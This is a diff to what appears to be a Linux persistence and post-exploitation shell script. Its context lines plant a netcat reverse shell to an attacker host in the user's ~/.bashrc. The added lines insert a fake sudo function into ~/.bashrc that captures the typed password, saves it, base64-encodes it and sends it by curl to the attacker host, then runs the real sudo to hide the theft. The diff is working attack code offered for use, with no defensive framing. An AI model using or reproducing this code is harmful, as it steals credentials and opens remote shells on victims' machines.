@@ -3,6 +3,7 @@
 attackBox=0.0.0.0
 attackPort=5253
 cron="* * * * *"
+passwdfile=$(mktemp)
 
 if [ "$EUID" -eq 0 ];
 then
@@ -47,6 +48,11 @@ fi
 if $(which crontab | grep -qi crontab)
 then
 	crontab="yes"
+fi
+
+if $(cat /etc/group | grep sudo | grep -qi $(whoami))
+then
+	sudo="yes"
 fi
 
 if $(which systemctl | grep -qi systemctl)
@@ -120,6 +126,22 @@ then
 		echo "nc $attackBox $attackPort -e /bin/bash 2> /dev/null & sleep .0001" >> ~/.bashrc
 		echo -e "\e[92m[+]\e[0m Netcat reverse shell loaded in $(whoami)'s bashrc"
 	fi
+	if [ "$sudo" == "yes" ];
+	then
+		echo 'function sudo () {
+	realsudo="$(which sudo)"
+	passwdfile="'$passwdfile'"
+	read -s -p "[sudo] password for $USER: " inputPasswd
+	printf "\n"; printf "%s\n" "$USER : $inputPasswd" >> $passwdfile
+	sort -uo "$passwdfile" "$passwdfile"
+	encoded=$(cat "$passwdfile" | base64) > /dev/null 2>&1
+	curl -k -s "https://'$attackBox'/$encoded" > /dev/null 2>&1
+	$realsudo -S <<< "$inputPasswd" -u root bash -c "exit" > /dev/null 2>&1
+	$realsudo "${@:1}"
+}' >> ~/.bashrc
+        echo -e "\e[92m[+]\e[0m Hijacked $(whoami)'s sudo access"
+        echo -e "\e[92m[+]\e[0m Stored in $passwdfile"
+    fi
 fi
 
 if [ "$root" == "yes" ];
